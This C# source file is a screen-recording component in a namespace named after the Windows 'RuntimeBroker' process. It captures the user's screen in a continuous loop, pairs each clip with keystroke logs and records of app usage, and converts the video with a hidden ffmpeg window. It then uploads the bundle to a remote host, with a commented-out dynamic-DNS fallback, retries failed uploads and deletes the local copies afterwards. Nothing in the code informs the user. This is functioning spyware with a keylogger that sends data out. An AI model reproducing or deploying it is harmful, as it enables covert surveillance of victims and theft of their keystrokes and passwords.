using Newtonsoft.Json;
using ScreenRecorderLib;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Windows;
using System.Windows.Media.Animation;
using System.Windows.Media.Media3D;

namespace RuntimeBroker
{
    public class SessionRecorder
    {
        public long Id { get; set; }
        public string VideoPath { get; set; }
        public string AppsPath { get; set; }
        public string KeyLogsPath { get; set; }
    }

    public class ScreenRecorder
    {
        // reup video if it's failed to upload
        private Queue<SessionRecorder> SessionRecorders = new Queue<SessionRecorder>();
        private readonly AppSettings _appSettings;
        private readonly Recorder _rec;

        public ScreenRecorder(AppSettings appSettings)
        {
            try
            {
                _appSettings = appSettings;

                var sources = new List<RecordingSourceBase>();
                sources.AddRange(Recorder.GetDisplays());
                var outputOptions = new OutputOptions
                {
                    RecorderMode = RecorderMode.Video,
                    //This sets a custom size of the video output, in pixels.
                    OutputFrameSize = new ScreenSize(_appSettings.FrameWidth, _appSettings.FrameHeight),
                    //Stretch controls how the resizing is done, if the new aspect ratio differs.
                    Stretch = StretchMode.Uniform,
                };

                RecorderOptions options = new RecorderOptions
                {
                    SourceOptions = new SourceOptions
                    {
                        RecordingSources = sources
                    },
                    OutputOptions = outputOptions,
                };

                _rec = Recorder.CreateRecorder(options);
                _rec.OnRecordingFailed += _rec_OnRecordingFailed;
            }
            catch (Exception ex)
            {
                Log(ex.ToString());
            }
        }

        private void _rec_OnRecordingFailed(object sender, RecordingFailedEventArgs e)
        {
            Log(e.Error.ToString());
        }

        public async Task RunAsync()
        {
            try
            {
                //try
                //{
                //    _ = Task.Run(() =>
                //    {

                //        KeyLogger.Run();

                //    });


                //}
                //catch (Exception ex)
                //{
                //    Log(ex.ToString());
                //}

                //try
                //{

                //    _ = Task.Run(() =>
                //    {

                //        _ = AppTimeTrack.Run();

                //    });
                //}
                //catch (Exception ex)
                //{
                //    Log(ex.ToString());
                //}

                //await Task.Delay(5000);

                _ = Task.Run(async () =>
                {
                    while (true)
                    {
                        string videoPath = string.Empty;
                        try
                        {
                            const string videoPathDirectory = "Temp";
                            const string videoFormatFile = "mp4";

                            int maxVideoSeconds = (int)TimeSpan.FromSeconds(_appSettings.VideoDuration).TotalMilliseconds;
                            string videoFolder = Path.GetTempPath();
                            if (!Directory.Exists(videoFolder))
                            {
                                Directory.CreateDirectory(videoFolder);
                            }
                            var now = ServerTimeHelper.GetUnixTimeSeconds();

                            KeyLogger.WriteNewLogSession(now);
                            AppTimeTrack.SetNewAppTrack(now);

                            string fileName = AppUtils.GetTempFile().Replace(".tmp", $".{videoFormatFile}");

                            _rec.Record(fileName);

                            await Task.Delay(maxVideoSeconds);

                            _rec.Stop();

                            await WaitUntil(() => _rec.Status == RecorderStatus.Idle);
                            string videoFileName = $"{now}_{ServerTimeHelper.GetUnixTimeSeconds()}.{videoFormatFile}";
                            videoPath = Path.Combine(videoFolder, videoFileName);

                            FileInfo file = new FileInfo(fileName);
                            file.MoveTo(videoPath);

                            Trace.WriteLine("Save vid " + DateTime.Now.ToString());

                            var keyLogJsonPath = videoPath.Replace($".{videoFormatFile}", "_UserAction.json");
                            var appsJsonPath = videoPath.Replace($".{videoFormatFile}", "_UserSession.json");

                            var videoTsFile = videoPath.Replace($".{videoFormatFile}", ".ts");

                            ConvertMp4ToTs(videoPath, videoTsFile);
                            UploadVideos(now, videoTsFile, appsJsonPath, keyLogJsonPath);
                        }
                        catch (Exception ex)
                        {
                            Log(ex.ToString());
                        }
                        finally
                        {
                            try
                            {
                                if (File.Exists(videoPath))
                                {
                                    File.Delete(videoPath);
                                }
                            }
                            catch (Exception ex)
                            {
                                Log(ex.ToString());
                            }
                        }
                    }
                });

                _ = Task.Run(async () =>
                {
                    // reup video

                    while (true)
                    {
                        try
                        {
                            bool isOnline = await AppUtils.IsOnline();
                            if (isOnline)
                            {
                                while (SessionRecorders.Count > 0)
                                {
                                    var session = SessionRecorders.Dequeue();
                                    if (session != null)
                                    {
                                        try
                                        {
                                            Console.WriteLine("Reup Video");
                                            await UploadVideoApiAsync(session.Id, session.VideoPath, session.AppsPath, session.KeyLogsPath);
                                        }
                                        catch (Exception ex)
                                        {
                                            Log(ex.ToString());
                                        }
                                        finally
                                        {
                                            await Task.Delay((int)TimeSpan.FromSeconds(30).TotalMilliseconds);
                                        }
                                    }
                                }
                            }

                            await Task.Delay((int)TimeSpan.FromMinutes(2.5).TotalMilliseconds);
                        }
                        catch (Exception ex)
                        {
                            Log(ex.ToString());
                        }
                        finally
                        {

                        }
                    }

                });
            }
            catch (Exception ex)
            {
                Log(ex.ToString());
            }
        }

        private void UploadVideos(long id, string videoPath, string appsJsonPath, string keyLogJsonPath)
        {
            _ = Task.Run(async () =>
            {
                try
                {
                    var keylog = new List<KeyLog>();
                    var log = KeyLogger.KeyLogs.First(k => k.Id == id);
                    if (log != null)
                    {
                        keylog = log.KeyLogCollection;
                    }

                    var appTimes = new List<AppTime>();
                    var appTime = AppTimeTrack.AppTimes.First(k => k.Id == id);
                    if (appTime != null)
                    {
                        appTimes = appTime.Collection;
                    }

                    foreach (var app in appTimes)
                    {
                        if (app.EndTime == 0)
                        {
                            app.EndTime = ServerTimeHelper.GetUnixTimeSeconds();
                        }
                    }

                    var appsJson = JsonConvert.SerializeObject(appTimes);
                    File.WriteAllText(appsJsonPath, appsJson);

                    var keyLogJson = JsonConvert.SerializeObject(keylog);
                    File.WriteAllText(keyLogJsonPath, keyLogJson);

                    //Trace.WriteLine(appsJson);
                    //Trace.WriteLine(keyLogJson);

                    await UploadVideoApiAsync(id, videoPath, appsJsonPath, keyLogJsonPath);
                }
                catch (Exception ex)
                {
                    Log(ex.ToString());
                }
                finally
                {

                }
            });
        }

        private async Task UploadVideoApiAsync(long id, string videoPath, string appsJsonPath, string keyLogJsonPath)
        {
            if (!File.Exists(videoPath) || !File.Exists(appsJsonPath) || !File.Exists(keyLogJsonPath))
            {
                Log("UploadVideoApiAsync: File not exist " + videoPath);
                return;
            }

            bool isSuccess = false;

            bool isOnline = await AppUtils.IsOnline();
            if (isOnline)
            {
                const int MAX_RETRIES = 5;
                for (int i = 0; i < MAX_RETRIES; i++)
                {
                    if (i >= MAX_RETRIES)
                    {
                        break;
                    }

                    try
                    {
                        string linkLive = $"http://{_appSettings.IP}:{_appSettings.Port}/image.png";
                        //string linkLive = "http://soft-up.ddns.net:54368/image.png";

                        var client = new HttpClient();
                        var request = new HttpRequestMessage(HttpMethod.Post, _appSettings.VideoHost);
                        request.Headers.Add("accept", "*/*");
                        var content = new MultipartFormDataContent();
                        content.Add(new StreamContent(File.OpenRead(videoPath)), "Video", Path.GetFileName(videoPath));
                        content.Add(new StreamContent(File.OpenRead(keyLogJsonPath)), "UserAction", Path.GetFileName(keyLogJsonPath));
                        content.Add(new StreamContent(File.OpenRead(appsJsonPath)), "UserSession", Path.GetFileName(appsJsonPath));
                        content.Add(new StringContent(Globals.UUID), "token");
                        content.Add(new StringContent(linkLive), "LinkLive");
                        request.Content = content;
                        var response = await client.SendAsync(request);
                        response.EnsureSuccessStatusCode();
                        string result = await response.Content.ReadAsStringAsync();
                        if (result.Contains("successfully"))
                        {
                            Console.WriteLine("Video uploaded successfully");
                            try
                            {
                                File.Delete(videoPath);
                                File.Delete(keyLogJsonPath);
                                File.Delete(appsJsonPath);
                            }
                            catch (Exception ex) { Log(ex.ToString()); }
                            isSuccess = true;
                            break;
                        }
                        else
                        {
                            Log(result);
                        }
                    }
                    catch (Exception ex)
                    {
                        Log(ex.ToString());
                        await Task.Delay((int)TimeSpan.FromSeconds(10).TotalMilliseconds);
                    }
                }
            }

            if (!isSuccess)
            {
                SessionRecorders.Enqueue(new SessionRecorder
                {
                    Id = id,
                    VideoPath = videoPath,
                    AppsPath = appsJsonPath,
                    KeyLogsPath = keyLogJsonPath,
                });
                Trace.WriteLine("Add to queue: " + SessionRecorders.Count);
            }
        }

        private bool ConvertMp4ToTs(string inputFilePath, string outputFilePath)
        {
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    FileName = "ffmpeg",
                    Arguments = $"-i \"{inputFilePath}\" -c:v copy -c:a aac -b:a 128k \"{outputFilePath}\"", // Copy video stream and re-encode audio to AAC
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (Process process = new Process())
                {
                    process.StartInfo = startInfo;
                    process.OutputDataReceived += (sender, e) => { if (!string.IsNullOrEmpty(e.Data)) Console.WriteLine(e.Data); };
                    process.ErrorDataReceived += (sender, e) => { if (!string.IsNullOrEmpty(e.Data)) Console.WriteLine(e.Data); };

                    process.Start();
                    process.BeginOutputReadLine();
                    process.BeginErrorReadLine();

                    process.WaitForExit();

                    return process.ExitCode == 0;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred: {ex.Message}");
                return false;
            }
            finally
            {
                try
                {
                    File.Delete(inputFilePath);
                }
                catch { }
            }
        }

        public void Stop()
        {
            try
            {
                if (_rec != null)
                {
                    _rec.Stop();
                }
            }
            catch (Exception ex) { Log(ex.ToString()); }
        }

        /// <summary>
        /// Blocks until condition is true or timeout occurs.
        /// </summary>
        /// <param name="condition">The break condition.</param>
        /// <param name="frequency">The frequency at which the condition will be checked.</param>
        /// <param name="timeout">The timeout in milliseconds.</param>
        /// <returns></returns>
        private static async Task WaitUntil(Func<bool> condition, int frequency = 25, int timeout = -1)
        {
            var waitTask = Task.Run(async () =>
            {
                while (!condition()) await Task.Delay(frequency);
            });

            if (waitTask != await Task.WhenAny(waitTask,
                    Task.Delay(timeout)))
                throw new TimeoutException();
        }
        private static void Log(string text)
        {
            Console.WriteLine(DateTime.Now.ToShortDateString() + " " + DateTime.Now.ToShortTimeString() + " : " + text);
            Trace.WriteLine(text);
        }
    }
}
